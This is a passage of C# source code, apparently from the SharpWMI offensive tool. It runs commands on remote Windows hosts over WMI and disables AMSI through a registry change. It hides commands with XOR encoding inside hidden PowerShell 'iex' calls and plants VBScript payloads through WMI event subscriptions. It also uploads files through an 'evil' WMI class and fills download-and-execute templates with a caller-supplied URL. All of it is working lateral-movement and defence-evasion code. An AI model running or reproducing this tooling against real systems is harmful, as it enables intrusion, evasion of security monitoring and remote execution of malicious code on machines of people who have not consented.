                            inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                            inParams3["sValueName"] = "AmsiEnable";
                            inParams3["uValue"] = originalvalue;
                            ManagementBaseObject outParams3 = reg1.InvokeMethod("SetDWORDValue", inParams3, null);
                            Console.WriteLine("[+] AmsiEnable set back to : {0}", originalvalue);
                        }
                        else if (originalvalue == "0")
                        {
                            Console.WriteLine("[+] AmsiEnable left at original value: {0}", originalvalue);
                        }
                    }
                    else
                    {
                        ManagementBaseObject inParams4 = reg1.GetMethodParameters("DeleteValue");
                        inParams4["hDefKey"] = 0x80000001;
                        inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                        inParams4["sValueName"] = "AmsiEnable";
                        ManagementBaseObject outParams4 = reg1.InvokeMethod("DeleteValue", inParams4, null);
                        Console.WriteLine("[+] Removed AmsiEnable Value");
                    }
                }
                else //Key did not exist
                {
                    ManagementBaseObject inParams3 = reg1.GetMethodParameters("DeleteValue");
                    inParams3["hDefKey"] = 0x80000001;
                    inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    inParams3["sValueName"] = "AmsiEnable";
                    ManagementBaseObject outParams3 = reg1.InvokeMethod("DeleteValue", inParams3, null);
                    Console.WriteLine("[+] AmsiEnable value removed");

                    ManagementBaseObject inParams2 = reg1.GetMethodParameters("DeleteKey");
                    inParams2["hDefKey"] = 0x80000001;
                    inParams2["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    ManagementBaseObject outParams2 = reg1.InvokeMethod("DeleteKey", inParams2, null);
                    Console.WriteLine("[+] Settings key removed");

                    ManagementBaseObject inParams4 = reg1.GetMethodParameters("DeleteKey");
                    inParams4["hDefKey"] = 0x80000001;
                    inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script";
                    ManagementBaseObject outParams4 = reg1.InvokeMethod("DeleteKey", inParams4, null);
                    Console.WriteLine("[+] Windows Script key removed");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        private static string XorEncode(string input, int key)
        {
            List<String> output = new List<string>();
            byte ch;

            for (int i = 0; i < input.Length; i++)
            {
                ch = (byte)(input[i] ^ key);
                output.Add(String.Format("{0:00}", ch));
            }

            return String.Join(",", output.ToArray());
        }

        static void RemoteWMIExecuteWithOutput(string host, string command, string user, string password, bool evadeAmsi, bool quiet = false)
        {
            var scope = new ManagementScope();
            string r = ConnectToWMI(ref scope, host, user, password, "root\\cimv2");
            if (r.Length > 0)
            {
                Console.WriteLine(r);
                return;
            }

            bool setResultVar = false;

            var rnd = new Random();
            string userName = "";
            List<ManagementBaseObject> originalAmsiKey = new List<ManagementBaseObject>();

            string resultVarName = ExecutionResultVariableName.Replace("##RANDOM##", rnd.Next(1, 1000000).ToString());
            string varName = String.Format("_F{0}", rnd.Next(1, 1000000));

            try
            {
                if (evadeAmsi)
                {
                    originalAmsiKey = SetRegKey(scope);
                }

                if (!String.IsNullOrEmpty(user))
                {
                    userName = String.Format("{0}\\{1}", GetWmiProperty(scope, "Win32_ComputerSystem", "Name"), user);
                }
                else
                {
                    userName = GetWmiProperty(scope, "Win32_ComputerSystem", "UserName");
                }

                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());
                ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");

                int randomXorKey = rnd.Next(1, 255);
                int randomXorKey2 = rnd.Next(1, 255);

                string encCommand = String.Format("iex([char[]](@({0})|%{{$_-bxor{1}}}) -join '')",
                    XorEncode(command, randomXorKey2), randomXorKey2);

                string tmpcmd = String.Format(
                    @"$o=({0} |Out-String).Trim();$e=(([Int[]][Char[]]$o)|%{{$_-bxor{1}}})-Join',';Set-WmiInstance -Class Win32_Environment -PutType CreateOnly -Impersonation Impersonate -EnableAllPrivileges -Arguments @{{Name='{2}'; VariableValue=$e; UserName='{3}'}}",
                    encCommand, randomXorKey, resultVarName, userName);

                tmpcmd = tmpcmd.Replace('\n', ' ').Replace('\r', ' ').Replace('\t', ' ').Replace("  ", " ");

                try
                {
                    SetEnvVarValue(scope, varName, tmpcmd, userName);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("{0}", ex.Message);
                    return;
                }

                inParams["CommandLine"] = String.Format("powershell -w hidden -nop -c \"iex($env:{0})\"", varName);

                setResultVar = true;
                ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);

                Console.WriteLine("[*] User name                      : {0}", userName);
                Console.WriteLine("[*] Creation of process returned   : {0}", outParams["returnValue"]);
                Console.WriteLine("[*] Process ID                     : {0}", outParams["processId"]);

                int count = 0;
                bool gotResult = false;
                string cmdResult = "";

                while (true)
                {
                    string resultOfWmiExecution = GetWMIResultProperty(scope, resultVarName, userName);
                    if (String.IsNullOrEmpty(resultOfWmiExecution))
                    {
                        if (count < 3)
                        {
                            count++;
                            Thread.Sleep(3000);
                        }
                        else
                        {
                            break;
                        }
                    }
                    else
                    {
                        gotResult = true;
                        string[] tmp = resultOfWmiExecution.Split(',');

                        try
                        {
                            SetEnvVarValue(scope, varName, "", userName);
                        }
                        catch { }

                        foreach (string i in tmp)
                        {
                            var n = (Convert.ToInt32(i)) ^ randomXorKey;
                            cmdResult += Convert.ToChar(n);
                        }
                        break;
                    }
                }

                if (gotResult)
                {
                    Console.WriteLine("[+] Command result:\r\n");
                    Console.WriteLine(cmdResult);
                }
                else
                {
                    Console.WriteLine("[*] No results could be retrieved as apparently we didn't set environment variable with results.");
                    Console.WriteLine("    This may indicate called SharpWMI did not invoked WMI using elevated/impersonated token.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[!] Exception catched while running remote process with output: {0}", ex.ToString()));
            }

            if (evadeAmsi)
            {
                try
                {
                    UnsetRegKey(scope, originalAmsiKey);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(String.Format("[!] Exception catched while restoring AMSI state: {0}", ex.ToString()));
                }
            }

            if (!String.IsNullOrEmpty(varName))
            {
                try
                {
                    DelEnvVar(scope, varName, userName);
                }
                catch (Exception ex2)
                {
                    Console.WriteLine("[!] Could not remove interim environment variable named {0}: {1}", varName, ex2.Message);
                }
            }

            if (setResultVar)
            {
                Console.WriteLine(ResetWMIResultProperty(scope, resultVarName, userName));
            }
        }

        static void RemoteWMIExecute(string host, string command, string username, string password, bool result, bool disableAmsi, bool quiet = false)
        {
            string wmiNameSpace = "root\\cimv2";
            ConnectionOptions options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            if (result)
            {
                RemoteWMIExecuteWithOutput(host, command, username, password, disableAmsi, quiet);
                return;
            }

            if (!quiet) Console.WriteLine("\r\n[*] Host                           : {0}", host);
            if (!quiet) Console.WriteLine("[*] Command                        : {0}", command);

            if (!String.IsNullOrEmpty(username))
            {
                if (!quiet) Console.WriteLine("[*] User credentials               : {0}", username);
                options.Username = username;
                options.Password = password;
            }

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                List<ManagementBaseObject> originalAmsiKey = new List<ManagementBaseObject>();
                if (disableAmsi)
                {
                    originalAmsiKey = SetRegKey(scope);
                }

                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());

                ManagementBaseObject inParams = wmiProcess.GetMethodParameters("Create");
                System.Management.PropertyDataCollection properties = inParams.Properties;

                var rnd = new Random();
                int randomXorKey = rnd.Next(1, 255);

                inParams["CommandLine"] = command;
                ManagementBaseObject outParams = wmiProcess.InvokeMethod("Create", inParams, null);

                if (!quiet) Console.WriteLine("[*] Creation of process returned   : {0}", outParams["returnValue"]);
                if (!quiet) Console.WriteLine("[*] Process ID                     : {0}", outParams["processId"]);

                if (disableAmsi)
                {
                    UnsetRegKey(scope, originalAmsiKey);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        static void RemoteWMIExecuteVBS(string host, string eventName, string username, string password, string payload, bool disableAmsi, int triggerTimerAfter, int scriptKillTimeout)
        {
            try
            {
                ConnectionOptions options = new ConnectionOptions
                {
                    Impersonation = ImpersonationLevel.Impersonate,
                    Authentication = AuthenticationLevel.PacketPrivacy,
                    EnablePrivileges = true,
                };

                if (!String.IsNullOrEmpty(username))
                {
                    Console.WriteLine("[*] User credentials: {0}", username);
                    options.Username = username;
                    options.Password = password;
                }
                Console.WriteLine();

                ManagementScope timerScope = new ManagementScope(string.Format(@"\\{0}\root\cimv2", host), options);
                ManagementClass timerClass = new ManagementClass(timerScope, new ManagementPath("__IntervalTimerInstruction"), null);
                ManagementObject myTimer = timerClass.CreateInstance();

                myTimer["IntervalBetweenEvents"] = (UInt32)(triggerTimerAfter * 1000);
                myTimer["SkipIfPassed"] = false;
                myTimer["TimerId"] = "Timer";

                try
                {
                    Console.WriteLine("[*] Creating Event Subscription {0} : {1} - with interval between events: {2} secs",
                        eventName, host, triggerTimerAfter);
                    myTimer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in creating timer object: {0}", ex.Message);
                    return;
                }

                ManagementScope scope = new ManagementScope(string.Format(@"\\{0}\root\subscription", host), options);

                List<ManagementBaseObject> originalAmsiKey = new List<ManagementBaseObject>();
                if (disableAmsi)
                {
                    originalAmsiKey = SetRegKey(timerScope);
                }

                // then install the __EventFilter for the timer object
                ManagementClass wmiEventFilter = new ManagementClass(scope, new ManagementPath("__EventFilter"), null);
                WqlEventQuery myEventQuery = new WqlEventQuery(@"SELECT * FROM __TimerEvent WHERE TimerID = 'Timer'");
                ManagementObject myEventFilter = wmiEventFilter.CreateInstance();

                myEventFilter["Name"] = eventName;
                myEventFilter["Query"] = myEventQuery.QueryString;
                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
                myEventFilter["EventNameSpace"] = @"\root\cimv2";

                try
                {
                    Console.WriteLine("[*] Setting '{0}' event filter on {1}", eventName, host);
                    myEventFilter.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event filter: {0}", ex.Message);
                }

                // now create the ActiveScriptEventConsumer payload (VBS)
                ManagementObject myEventConsumer = new ManagementClass(scope, new ManagementPath("ActiveScriptEventConsumer"), null).CreateInstance();

                myEventConsumer["Name"] = eventName;
                myEventConsumer["ScriptingEngine"] = "VBScript";
                myEventConsumer["ScriptText"] = payload;
                myEventConsumer["KillTimeout"] = (UInt32)scriptKillTimeout;

                try
                {
                    Console.WriteLine("[*] Setting '{0}' event consumer on {1} to kill script after {2} secs", eventName, host, scriptKillTimeout);
                    myEventConsumer.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting event consumer: {0}", ex.Message);
                }

                // finally bind them together with a __FilterToConsumerBinding
                ManagementObject myBinder = new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"), null).CreateInstance();

                myBinder["Filter"] = myEventFilter.Path.RelativePath;
                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;

                try
                {
                    Console.WriteLine("[*] Binding '{0}' event filter and consumer on {1}", eventName, host);
                    myBinder.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in setting FilterToConsumerBinding: {0}", ex.Message);
                }

                // wait for everything to trigger
                Console.WriteLine("\r\n[*] Waiting {0} seconds for event to trigger on {1} ...\r\n", triggerTimerAfter, host);
                System.Threading.Thread.Sleep((triggerTimerAfter) * 1000);

                if (disableAmsi)
                {
                    UnsetRegKey(timerScope, originalAmsiKey);
                }

                // finally, cleanup
                try
                {
                    Console.WriteLine("[*] Removing 'Timer' internal timer from {0}", host);
                    myTimer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing 'Timer' interval timer: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing FilterToConsumerBinding from {0}", host);
                    myBinder.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing FilterToConsumerBinding: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing '{0}' event filter from {1}", eventName, host);
                    myEventFilter.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event filter: {0}", ex.Message);
                }

                try
                {
                    Console.WriteLine("[*] Removing '{0}' event consumer from {1}\r\n", eventName, host);
                    myEventConsumer.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing event consumer: {0}", ex.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
            }
        }

        public static void UploadFileViaWMI(string host, string username, string password, byte[] fileData, string destPath, bool disableAmsi)
        {
            string wmiNameSpace = "root\\cimv2";
            string className = FileUploadTempWMIClassName;
            string evilPropertyName = FileUploadTempWMIPropertyName;

            ConnectionOptions options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);

            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("  User credentials: {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();

            StringBuilder encodedFileData = new StringBuilder();
            for (int i = 0; i < fileData.Length; i++)
            {
                encodedFileData.Append(fileData[i].ToString());
                if (i != (fileData.Length - 1)) encodedFileData.Append(",");
            }

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                // We're creating a static WMI class here
                ManagementObject evilClass = new ManagementClass(scope, null, null);
                evilClass["__CLASS"] = className;
                evilClass.Properties.Add(evilPropertyName, CimType.String, false);
                evilClass.Properties[evilPropertyName].Value = encodedFileData.ToString();

                try
                {
                    Console.WriteLine("[*] Uploading file via evil WMI static class' property: {0} ...", evilPropertyName);
                    evilClass.Put();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception during setting evil property with file contents: {0}", ex.Message);
                    return;
                }

                string command = String.Format(@"powershell -w hidden -nop -c ""$e=([WmiClass]'{0}:{1}').Properties['{2}'].Value;[IO.File]::WriteAllBytes('{3}',[Byte[]][Int[]]($e-split','))""",
                    wmiNameSpace, evilClass, evilPropertyName, destPath);

                // Issuing remote WMI command to let the target fetch bytes from evil WMI class and store them into file.
                Console.WriteLine("[*] Pulling contents from WMI repository to disk on a remote machine...");
                RemoteWMIExecute(host, command, username, password, false, disableAmsi, true);

                int count = 0;
                bool success = false;

                // Now we're confirming the upload
                string wmiQuery = String.Format(@"SELECT * FROM CIM_DataFile WHERE Name = ""{0}""", destPath.Replace("\\", "\\\\"));
                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);

                Console.WriteLine("[*] Confirming whether file was uploaded...");
                while (count < 5)
                {
                    System.Threading.Thread.Sleep(2000);

                    ManagementObjectCollection data = searcher.Get();

                    foreach (ManagementObject result in data)
                    {
                        System.Management.PropertyDataCollection props = result.Properties;
                        foreach (System.Management.PropertyData prop in props)
                        {
                            if (prop.Name.ToLower() == "name" && ((string)prop.Value).ToLower() == destPath.ToLower())
                            {
                                success = true;
                                break;
                            }
                        }

                        if (success) break;
                    }

                    if (success) break;
                }

                // cleanup
                try
                {
                    Console.WriteLine("[*] Removing evil WMI class {0}", evilClass);
                    evilClass.Delete();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[X] Exception in removing evil WMI class: {0}", ex.Message);
                }

                if (success)
                {
                    Console.WriteLine("\r\n[+] SUCCESS: File uploaded: {0}", Path.GetFileName(destPath));
                }
                else
                {
                    Console.WriteLine("\r\n[-] FAILURE: Could not confirm whether file was uploaded: {0}", Path.GetFileName(destPath));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        public static byte[] GetFileContents(string filePath)
        {
            return File.ReadAllBytes(filePath);
        }

        public static string Base64Decode(string input)
        {
            byte[] data = System.Convert.FromBase64String(input);
            string output = System.Text.ASCIIEncoding.ASCII.GetString(data);

            return output;
        }

        static string GetVBSPayload(Dictionary<string, string> arguments)
        {
            string payload = "";

            foreach (KeyValuePair<string, string> entry in arguments)
            {
                if(entry.Key == "command" && !arguments.ContainsKey("url"))
                {
                    Console.WriteLine("[*] Used template VBScript for command execution.");
                    payload = TemplateVBSCommand.Replace("COMMAND", entry.Value);
                    break;
                }
                else if (entry.Key == "scriptb64")
                {
                    if(File.Exists(entry.Value))
                    {
                        payload = Base64Decode(File.ReadAllText(entry.Value));
                        Console.WriteLine(String.Format("[*] Read {0} bytes from {1} file with base64 encoded VBScript payload.", payload.Length, entry.Value));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[*] Using direct script's parameter as base64 encoded VBScript payload.");
                        payload = Base64Decode(entry.Value);
                    }
                    break;
                }
                else if (entry.Key == "script")
                {
                    if (File.Exists(entry.Value))
                    {
                        payload = File.ReadAllText(entry.Value);
                        Console.WriteLine(String.Format("[*] Read {0} bytes from {1} file with VBScript payload.", payload.Length, entry.Value));
                        break;
                    }
                    else
                    {
                        Console.WriteLine("[*] Using direct script's parameter as VBScript payload.");
                        payload = entry.Value;
                    }
                    break;
                }
                else if (entry.Key == "url")
                {
                    if (entry.Value.Contains(","))
                    {
                        string[] foo = entry.Value.Split(',');
                        if (foo.Length != 2 || foo[1].Trim().Length < 1)
                        {
                            Console.WriteLine("[!] Error: URL must be in form: url=URL,TargetFile");
                            System.Environment.Exit(1);
                        }

                        Console.WriteLine("[*] Using VBScript that downloads a binary file from URL to DST and executes it.");
                        payload = TemplateVBSDownloadAndExec.Replace("DOWNLOAD_URL", foo[0].Trim());
                        payload = payload.Replace("TARGET_FILE", foo[1].Trim());

                        Console.WriteLine("[*] Will download from   : " + foo[0].Trim());
                        Console.WriteLine("[*] And store the file at: " + foo[1].Trim());
                    }
                    else
                    {
                        Console.WriteLine("[*] Using VBScript that downloads a script and executes it using Powershell via StdIn.");
                        payload = TemplateVBSDownloadPSAndExec.Replace("DOWNLOAD_URL", entry.Value);
                    }

                    if (arguments.ContainsKey("command"))
                    {
                        payload = payload.Replace("COMMAND", arguments["command"]);
                        Console.WriteLine("[*] Will issue command   : " + arguments["command"]);
                    }
                    else
                    {
                        payload = payload.Replace("COMMAND", "");
                    }

                    break;
                }
            }

            return payload;
        }

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Usage();
                return;
            }

            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            string username = "";
            string password = "";
            bool result = false;
            bool disableAmsi = false;

            if (arguments.ContainsKey("username"))
            {
                if (!arguments.ContainsKey("password"))
                {
                    Usage();
                    return;
                }
                else
                {
                    username = arguments["username"];
                    password = arguments["password"];
                }
            }

            if (arguments.ContainsKey("result"))
            {
                result = arguments["result"].ToLower() == "true";
            }

            if (arguments.ContainsKey("amsi"))
            {
                disableAmsi = arguments["amsi"].ToLower() == "disable";
            }

            if (arguments.ContainsKey("password") && !arguments.ContainsKey("username"))
            {
                Usage();
                return;
            }

            if (!arguments.ContainsKey("action"))
            {
                Usage();
                return;
            }

            if(!arguments.ContainsKey("computername"))
            {
                arguments["computername"] = "localhost";
            }

            if (arguments["action"] == "query")
            {
                if (!arguments.ContainsKey("query"))
                {
                    Usage();
                    return;
                }

                if (arguments.ContainsKey("computername"))
                {
                    // remote query
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        if (arguments.ContainsKey("namespace"))
                        {
                            RemoteWMIQuery(computerName, arguments["query"], arguments["namespace"], username, password);
                        }
                        else
                        {
                            RemoteWMIQuery(computerName, arguments["query"], "", username, password);
                        }
                    }
                }
                else
                {
                    // local query
                    if (arguments.ContainsKey("namespace"))
                    {
                        LocalWMIQuery(arguments["query"], arguments["namespace"]);
                    }
                    else
                    {
                        LocalWMIQuery(arguments["query"]);
                    }
                }
            }
            else if (arguments["action"] == "create" || arguments["action"] == "execute" || arguments["action"] == "exec")
            {
                // remote process call creation
                if ((arguments.ContainsKey("command")))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        RemoteWMIExecute(computerName, arguments["command"], username, password, result, disableAmsi);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else if (arguments["action"] == "upload")
            {
                if (arguments.ContainsKey("source") && arguments.ContainsKey("dest"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    byte[] fileData = GetFileContents(arguments["source"]);

                    foreach (string computerName in computerNames)
                    {
                        UploadFileViaWMI(computerName, username, password, fileData, arguments["dest"], disableAmsi);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else if (arguments["action"] == "loggedon")
            {
                string[] computerNames = arguments["computername"].Split(',');
                foreach (string computerName in computerNames)
                {
                    GetLoggedOnUsers(computerName, username, password);
                }
            }
            else if (arguments["action"] == "ps")
            {
                string[] computerNames = arguments["computername"].Split(',');
                foreach (string computerName in computerNames)
                {
                    GetProcesses(computerName, username, password);
                }
            }
            else if (arguments["action"] == "getenv")
            {
                string varName = "";
                if (arguments.ContainsKey("name")) varName = arguments["name"];

                string[] computerNames = arguments["computername"].Split(',');
                foreach (string computerName in computerNames)
                {
                    GetEnvVar(varName, computerName, username, password);
                }
            }
            else if (arguments["action"] == "setenv")
            {
                if (arguments.ContainsKey("name") && arguments.ContainsKey("value"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        SetEnvVarValue(arguments["name"], arguments["value"], computerName, username, password);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else if (arguments["action"] == "delenv")
            {
                if (arguments.ContainsKey("name"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        DelEnvVar(arguments["name"], computerName, username, password);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else if (arguments["action"] == "terminate")
            {
                if (arguments.ContainsKey("process"))
                {
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        TerminateProcesses(arguments["process"], computerName, username, password);
                    }
                }
                else
                {
                    Usage();
                    return;
                }
            }
            else if (arguments["action"] == "firewall")
            {
                if (arguments.ContainsKey("computername"))
                {
                    // remote query
                    string[] computerNames = arguments["computername"].Split(',');
                    foreach (string computerName in computerNames)
                    {
                        RemoteWMIFirewall(computerName, username, password);
                    }
                }
                else
                {
                    Usage();
                }
            }
            else if (arguments["action"] == "executevbs")
            {
                // remote VBS execution
                string[] computerNames = arguments["computername"].Split(',');
                string payload = GetVBSPayload(arguments);

                // in seconds
                int triggerTimerAfter = 10;
                int scriptKillTimeout = 12;

                if (arguments.ContainsKey("trigger"))
                {
                    triggerTimerAfter = Int32.Parse(arguments["trigger"]);
                }

                if (arguments.ContainsKey("timeout"))
                {
                    scriptKillTimeout = Int32.Parse(arguments["timeout"]);
                }

                Console.WriteLine(String.Format(@"[*] Script will trigger after {0} and we'll wait for {1} seconds.",
                    triggerTimerAfter, scriptKillTimeout));

                foreach (string computerName in computerNames)
                {
                    string eventName = "Debug";
                    if (arguments.ContainsKey("eventname"))
                    {
                        eventName = arguments["eventname"];
                    }

                    RemoteWMIExecuteVBS(computerName, eventName, username, password, payload, disableAmsi, triggerTimerAfter, scriptKillTimeout);
                }
            }
            else
            {
                Usage();
                return;
            }
        }
    }
}
